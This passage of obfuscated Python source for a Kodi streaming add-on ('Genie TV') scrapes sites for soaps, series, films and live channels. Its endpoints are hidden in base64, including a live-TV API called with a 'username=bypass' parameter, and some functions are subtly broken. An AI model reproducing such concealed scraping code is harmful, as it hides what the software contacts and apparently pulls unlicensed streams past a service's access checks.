    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Source 4 Links" )
    if 76 - 76: OoooooooOO * OoooooooOO - oo0OO - iIii1I11I1II1 . OoooooooOO / ii11ii1ii
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if oOoO != 'Failed' :
  III11I11ii = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( oOoO )
  for iI1i11 , o0O0o0 , OO in III11I11ii :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( '[COLORgreen]' + OO + ' - Source - Dizi[/COLOR]' , iI1i11 , 8062 , o0O0o0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 80 , "" , "Getting Dizi Links" )
    if 86 - 86: o0Oo0O0Oo00oO
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if Ii1111III1 != 'Failed' :
  oO00oooo0 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( Ii1111III1 )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in oO00oooo0 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOooo000oOO ( ( '[COLORgreen]' + OO + '- Source Scooby[/COLOR]' ) , iI1i11 , 1016 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 90 , "" , "Getting Scooby Links" )
    if 51 - 51: Ooo00oOo00o - i11iIiiIii * OOOo0
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
    if 95 - 95: iii11 % ii11ii1ii + OOooOOo % o0Oo0O0Oo00oO
 Ii1i = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 19 - 19: o0Oo0O0Oo00oO % OoIii111II
 for IiiiI in Ii1i :
  iiIIi = IIiiiiiiIi1I1 + IiiiI + II11iiii1Ii
  Ii11IiIiiii1 = ooOOO0 ( iiIIi )
  if Ii11IiIiiii1 != 'Failed' :
   III1iiiII1ii = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( Ii11IiIiiii1 )
   for OO , o0OO0o0o00o , iI1i11 , o0O0o0 , I1iI , Ii1ii11IIIi in III1iiiII1ii :
    if IIi1I1iiiii in OO . lower ( ) :
     ooOooo000oOO ( '[COLORgreen]' + OO + ' - Source Pandoras[/COLOR]' , iI1i11 , Ii1ii11IIIi , o0O0o0 , I1iI , o0OO0o0o00o )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Pandoras Links" )
     if 22 - 22: OoIii111II . OoOoOO00 . Oo
     Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
     if 91 - 91: OoOoOO00 . iii11 + OOooOOo
     if 8 - 8: iii11 * Oo / oo0OO - Ooo00oOo00o - OoooooooOO
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def oOiIi ( ) :
 if 65 - 65: OoOoOO00 + i1IIi * i11iIiiIii
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 OoOO = ooOOO0 ( iI1i11 )
 o0o = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( OoOO )
 for OO , o0O0o0 , Ii1i1i in o0o :
  o00OO0o0 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( o0O0o0 ) . replace ( '\\' , '' )
  if IIi1I1iiiii in OO . lower ( ) :
   ooOO00oOOo000 ( OO , '' , 7022 , o00OO0o0 )
   if 39 - 39: o0Oo0O0Oo00oO % ii11ii1ii - oo0OO
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 48 - 48: i11iIiiIii
 if 52 - 52: iIii1I11I1II1
def I1 ( url ) :
 OO0oOoO000o0 = cloudflare . source ( url )
 o0o = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode" href=".+?">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode-name" href=".+?">\n(.+?)</a>' ) . findall ( OO0oOoO000o0 )
 for url , oO0O0 , iIiIIi1 , OO in o0o :
  ooOO00oOOo000 ( ( oO0O0 ) . replace ( 'Sezon' , ' Season ' ) + ( iIiIIi1 ) . replace ( 'Bölüm' , ' Episode ' ) + OO , url , 8063 , '' )
  if 95 - 95: O0 / Ooo0OO0oOO . O0o0Ooo
  if 17 - 17: Ooo0OO0oOO
  if 56 - 56: o0Oo0O0Oo00oO * OOooOOo + Ooo0OO0oOO
  if 48 - 48: OoO0O0 * Ooo00oOo00o % O0o0Ooo - Ooo0OO0oOO
def Oo0000OOO0 ( url ) :
 OO0oOoO000o0 = cloudflare . source ( url )
 o0o = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( OO0oOoO000o0 )
 for url , OO in o0o :
  oOO0OO0OO ( OO , url , 222 , '' )
  if 68 - 68: i1IIi - oo0OO . o0Oo0O0Oo00oO - Oo + iIii1I11I1II1 + O0o0Ooo
  if 25 - 25: iIii1I11I1II1 % OoOoOO00 / Ooo0OO0oOO / ii11ii1ii
  if 22 - 22: OoIii111II * oo0OO
  if 4 - 4: I1IiI - OoIii111II + OOOo0
def iiIiIiIiiIiI ( ) :
 if 23 - 23: Ooo00oOo00o / oo0OO / iIii1I11I1II1
 OO0oOoO000o0 = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 o0o = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( OO0oOoO000o0 )
 for iI1i11 , o0O0o0 , OO , iIiIIi1 in o0o :
  ooOO00oOOo000 ( OO + '  -  ' + ( iIiIIi1 ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , iI1i11 , 8063 , o0O0o0 )
  if 44 - 44: Oo . Oo + OoooooooOO * i11iIiiIii / Ooo0OO0oOO + O0o0Ooo
def iIiII11 ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3d3dy50dmd1aWRlLmNvLnVrLw==' ) )
 o0o = re . compile ( '<a href="(.+?)"  qt-title=".+?" qt-text=".+?<br> .+?" title="(.+?)".+?class=".+? src="(.+?)" alt=".+?" /></a>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO , o0O0o0 in o0o :
  oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 8002 , o0O0o0 )
def II11IiiiiI1i ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<table border="0".+?url((.+?));background-repeat: no-repeat;">.+?<tr>.+?<span class="season">(.+?)</span><br>.+?<a href="(.+?)"+?>(.+?)</span><br>.+?<span class="programmetext">(.+?)</span></a><br>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for o0O0o0 , time , url , OO , OO0oOOo0o in o0o :
  ooOooo000oOO ( '%s %s' % ( '[COLORgreen]' + OO + '[/COLOR]' , time ) , url , 1015 , o0O0o0 , OO0oOOo0o )
  if 68 - 68: Ooo0OO0oOO * OoOoOO00 + I1IiI
def oOo ( ) :
 if 77 - 77: i1IIi * OoooooooOO % oo0OO % OOooOOo % o0Oo0O0Oo00oO / ii11ii1ii
 ooOO00oOOo000 ( 'Coronation Street' , '' , 8001 , '' )
 ooOO00oOOo000 ( 'Eastenders' , '' , 8002 , '' )
 ooOO00oOOo000 ( 'Emmerdale' , '' , 8003 , '' )
 ooOO00oOOo000 ( 'Hollyoaks' , '' , 8004 , '' )
 ooOO00oOOo000 ( 'Im a Celebrity' , '' , 8005 , '' )
 if 64 - 64: i11iIiiIii . o0Oo0O0Oo00oO
 if 93 - 93: O0 - Ooo00oOo00o . OOOo0
 if 64 - 64: I1IiI + OOooOOo
 if 65 - 65: OoOoOO00 / Oo
def iiII1i ( ) :
 OoOO = ooOOO0 ( 'http://uksoapshare.blogspot.co.uk/' )
 o0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if 'Holly' in OO :
   o0O0o0 = 'http://2.bp.blogspot.com/-9c7Sieh1RKs/UjD6TGAEEnI/AAAAAAAAAC8/84uwHfxcuYg/s1600/Hollyoaks.png'
   if 'huge' in iI1i11 :
    oOO0OO0OO ( ( OO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , o0O0o0 )
   else :
    pass
    if 19 - 19: OOOo0 + i11iIiiIii . OoO0O0 - Ooo0OO0oOO / ii11i1 + OOooOOo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE_IGNORE_THE ) ;
 if 38 - 38: Oo / iIii1I11I1II1 * iIii1I11I1II1 % ii11ii1ii
def O00o ( ) :
 OoOO = ooOOO0 ( 'http://uksoapshare.blogspot.co.uk/' )
 o0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if 'East' in OO :
   o0O0o0 = 'http://3.bp.blogspot.com/-KWHcNbNJU8Y/Vi1ousRl7fI/AAAAAAAAAT8/ksNE12LH0nE/s1600/eastenders.jpg'
   if 'huge' in iI1i11 :
    oOO0OO0OO ( ( OO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , o0O0o0 )
   else :
    pass
    if 55 - 55: o0Oo0O0Oo00oO % Ooo0OO0oOO / i11iIiiIii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 20 - 20: OoO0O0 / O0o0Ooo * OoO0O0 * Ooo00oOo00o
def OOOOoO ( ) :
 OoOO = ooOOO0 ( 'http://uksoapshare.blogspot.co.uk/' )
 o0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if 'Emmer' in OO :
   o0O0o0 = 'http://2.bp.blogspot.com/-UfDcxisVV5c/UjH9vUicZ3I/AAAAAAAAADc/8Ozuiz1ojxw/s1600/Emmerdale.jpg'
   if 'huge' in iI1i11 :
    oOO0OO0OO ( ( OO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , o0O0o0 )
   else :
    pass
    if 80 - 80: Oo % OoO0O0 % OoooooooOO * Oo % ii11i1
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 41 - 41: OoooooooOO / i1IIi
def OO0Ooo0Oooo ( ) :
 OoOO = ooOOO0 ( 'http://uksoapshare.blogspot.co.uk/' )
 o0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if 'Coro' in OO :
   o0O0o0 = 'http://3.bp.blogspot.com/-hofvfBQVexs/UjErIfNdS4I/AAAAAAAAADQ/Q-vVGu3apYU/s1600/corrie.jpg'
   if 'huge' in iI1i11 :
    oOO0OO0OO ( ( OO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , o0O0o0 )
   else :
    pass
    if 4 - 4: OoO0O0
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 93 - 93: OoIii111II % i1IIi
def OOo0OOoo00 ( ) :
 OoOO = ooOOO0 ( 'http://uksoapshare.blogspot.co.uk/' )
 o0o = re . compile ( '<a href="(.+?)" target="_blank">(.+?)</a>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if 'Celeb' in OO :
   o0O0o0 = 'http://3.bp.blogspot.com/-a_yDotWU_pY/VkotKWaG_gI/AAAAAAAAAUk/8Q5iNM6p37k/s1600/iacgoh.jpg'
   if 'huge' in iI1i11 :
    oOO0OO0OO ( ( OO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , o0O0o0 )
   else :
    pass
    if 22 - 22: o0Oo0O0Oo00oO / o0Oo0O0Oo00oO - ii11i1 % Ooo0OO0oOO . iii11 + OoO0O0
def OooO00oo0O0 ( name , url ) :
 i1iI = urlresolver . HostedMediaFile ( url ) . valid_url ( )
 if i1iI :
  Ooiiii11iI1 = urlresolver . HostedMediaFile ( url ) . resolve ( )
 else :
  iIIiiI1II1i11 = open_url ( url )
  url = re . compile ( 'src="(.+?)"></iframe>' ) . findall ( iIIiiI1II1i11 ) [ 0 ]
  url = url . split ( '?autoplay' ) [ 0 ]
  iIIiiI1II1i11 = open_url ( url )
  Oo00Oo = re . compile ( 'mp4","url":"(.+?)"' ) . findall ( iIIiiI1II1i11 ) [ - 1 ]
  Ooiiii11iI1 = Oo00Oo . replace ( '\\/' , '/' )
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , '' , '' )
 iiO0O0o0oO0O00 . setPath ( Ooiiii11iI1 )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , iiO0O0o0oO0O00 )
 if 25 - 25: iIii1I11I1II1
 if 63 - 63: o0Oo0O0Oo00oO
def oO0oOOOooo ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5kaXppYm94aGQuY29tLw==' ) )
 o0o = re . compile ( 'class="film menu-item menu-item-type-post_type menu-item-object-page menu-item-36980"><a href="(.+?)"><i class="fa fa-film"></i><span>(.+?)</span></a></li>' ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( 'class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52949"><a href="(.+?)"><i class="fa fa-"></i><span>(.+?)</span></a></li>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( 'Diziler' , 'Series' ) , iI1i11 , 7071 , ii11iIi1I + 'popcorn.png' )
 for iI1i11 , OO in oo000 :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( 'Filmler' , 'Movies' ) , iI1i11 , 7071 , ii11iIi1I + 'popcorn.png' )
  if 6 - 6: iIii1I11I1II1 - iIii1I11I1II1 % OOooOOo / iIii1I11I1II1 * O0o0Ooo
def iIio0oooo0OOo00 ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 o0o = re . compile ( '<a class="nav-item" href="(.+?)">(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  if 'Movies' in OO :
   ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.snagfilms.com' + ( iI1i11 ) . replace ( 'http://www.snagfilms.com' , '' ) , 7061 , ii11iIi1I + 'popcorn.png' )
def OOO0 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 o0o = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( "<li class='current'>.+?</li><li ><a href='(.+?)'>.+?</a></li><li" , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , o0O0o0 )
 for url in oo000 :
  ooOO00oOOo000 ( '[COLORgreen]NEXT PAGE[/COLOR]' , ( url ) . replace ( '&#038;' , '&' ) , 7063 , ii11iIi1I + 'Next.png' )
  if 16 - 16: oo0OO / iIii1I11I1II1 + iii11 * oo0OO * Ooo0OO0oOO
  if 8 - 8: O0o0Ooo
def II11IIii1iIiI1I1I1 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 o0o = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7062 , o0O0o0 )
  if 66 - 66: I1IiI + OOooOOo
  if 54 - 54: ii11ii1ii + ii11ii1ii + Ooo0OO0oOO % i1IIi % i11iIiiIii
def o00oO000 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , o0O0o0 )
  if 30 - 30: OoO0O0
def O0oo ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<div class="film-container">.+?<iframe src="(.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  Oo0O0O ( 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) )
  if 8 - 8: i11iIiiIii * O0 + ii11ii1ii . iIii1I11I1II1 % Ooo0OO0oOO / Ooo0OO0oOO
def Oo0O0O ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'file: "(.+?)",.+?label: "(.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 222 , ii11iIi1I + 'popcorn.png' )
  if 70 - 70: OOOo0 + ii11i1
  if 70 - 70: OoO0O0 . i11iIiiIii
  if 76 - 76: oo0OO . OoO0O0 % oo0OO - O0o0Ooo
  if 51 - 51: OoooooooOO + OOooOOo * iIii1I11I1II1 * OoIii111II / i1IIi
def I11IiI1i ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '</h4><p><ul><li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( '<li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  if '(cooltvseries.com)' in OO :
   oOO0OO0OO ( ( '[COLORgreen]' + OO + ' -(360)-[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
 for url , OO in oo000 :
  if '(cooltvseries.com)' in OO :
   oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
def OooO ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<source type="video/mp4" src="([^"]*)"/>' ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  Ooo0 ( ( url ) . replace ( ' ' , '%20' ) )
  if 85 - 85: OoOoOO00
  if 55 - 55: ii11ii1ii
def oOoo0OO0 ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vc2VjcmV0L2Nsb3VkLnBocA==' ) )
 o0o = re . compile ( '<li class="col-sm-2">.+?<a href="#" class="thumbnail" data-src="(.+?)" data-toggle="modal".+?data-target="#infoModal" name="(.+?)"> <img src="(.+?)" alt=".+?" width="130px"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO , o0O0o0 in o0o :
  oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://stream.cloudtv.bz/stream/channel/20/' + ( i1111 ( iI1i11 ) ) , 222 , o0O0o0 )
  if 5 - 5: i11iIiiIii * Oo
def i111 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'src="([^"]*)".+?alt=""></a><div class="entry unvoted"><p class="title"><a class="title may-blank " href="([^"]*)" tabindex=.+?>(.+?)</a>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 next = re . compile ( '<a href="([^"]*)" rel="nofollow next"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for o0O0o0 , url , OO in o0o :
  if 'youtu' in url :
   oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '&quot;' , '"' ) . replace ( '&' , ' & ' ) , url , 7051 , 'http:' + o0O0o0 )
 for url in next :
  ooOO00oOOo000 ( '[COLORgreen]NEXT[/COLOR]' , url , 7050 , ii11iIi1I + 'Next.png' )
  if 71 - 71: Ooo00oOo00o
def ooOOO0ooO0o ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'rel="shortlink" href="([^"]*)">' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  yt . PlayVideo ( ( url ) . replace ( 'https://youtu.be/' , '' ) )
  if 72 - 72: iii11 % OoooooooOO % OOooOOo * iii11 % OOOo0 * ii11i1
def iI11IiIiiII1 ( url ) :
 iIIiiI1II1i11 = ooOOO0
 o0o = re . compile ( 'id:"(.+?)",url:"(.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 222 , o0O0o0 )
  if 15 - 15: o0Oo0O0Oo00oO - O0 % OOOo0 . OoooooooOO * Oo / O0
  if 18 - 18: I1IiI / OoO0O0 / iIii1I11I1II1 - ii11ii1ii . i11iIiiIii
  if 86 - 86: O0o0Ooo * Oo . oo0OO
  if 96 - 96: OOooOOo % OoO0O0 / iii11
  if 63 - 63: i1IIi % i11iIiiIii % OoOoOO00 * OoooooooOO
def iIiII1 ( ) :
 if 47 - 47: Ooo0OO0oOO
 ooOO00oOOo000 ( 'All Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Entertainment' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Movies' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Music' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'News' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Sports' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Documentary' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Kids' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Food' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Religious' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'USA Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 ooOO00oOOo000 ( 'Other' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 if 92 - 92: OoooooooOO % OOOo0 / I1IiI * I1IiI % i11iIiiIii / OoooooooOO
 if 47 - 47: i11iIiiIii / Oo - Oo * Ooo00oOo00o
def i11iIiiIi11I ( Cat_Name ) :
 if 67 - 67: O0 % O0o0Ooo
 III = False
 I1I = '0'
 if Cat_Name == 'All Channels' : III = True
 if Cat_Name == 'Entertainment' : I1I = '1'
 if Cat_Name == 'Movies' : I1I = '2'
 if Cat_Name == 'Music' : I1I = '3'
 if Cat_Name == 'News' : I1I = '4'
 if Cat_Name == 'Sports' : I1I = '5'
 if Cat_Name == 'Documentary' : I1I = '6'
 if Cat_Name == 'Kids' : I1I = '7'
 if Cat_Name == 'Food' : I1I = '8'
 if Cat_Name == 'Religious' : I1I = '9'
 if Cat_Name == 'USA Channels' : I1I = '10'
 if Cat_Name == 'Other' : I1I = '11'
 if 70 - 70: ii11i1 . O0 - iii11
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 o0o = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 print 'Len Match: >>>' + str ( len ( o0o ) )
 for OO , o0O0o0 , Ii1i1i in o0o :
  o00OO0o0 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( o0O0o0 ) . replace ( '\\' , '' )
  if Ii1i1i == I1I :
   ooOO00oOOo000 ( OO , '' , 7022 , o00OO0o0 )
  elif III == True :
   ooOO00oOOo000 ( OO , '' , 7022 , o00OO0o0 )
  else : pass
  if 62 - 62: O0o0Ooo * Ooo0OO0oOO
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 74 - 74: I1IiI . iIii1I11I1II1
def oOOoO0oO0oo0O ( Search_Name ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 o0o = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 o0o = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for o0O0o0 , iI1i11 , Ooo0OOoOoO0 , IIo0Oo0oO0oOO00 in o0o :
  o00OO0o0 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( o0O0o0 ) . replace ( '\\' , '' )
  oOO0OO0OO ( Search_Name + ': Link 1' , ( iI1i11 ) . replace ( '\\' , '' ) , 222 , o00OO0o0 )
  oOO0OO0OO ( Search_Name + ': Link 2' , ( Ooo0OOoOoO0 ) . replace ( '\\' , '' ) , 222 , o00OO0o0 )
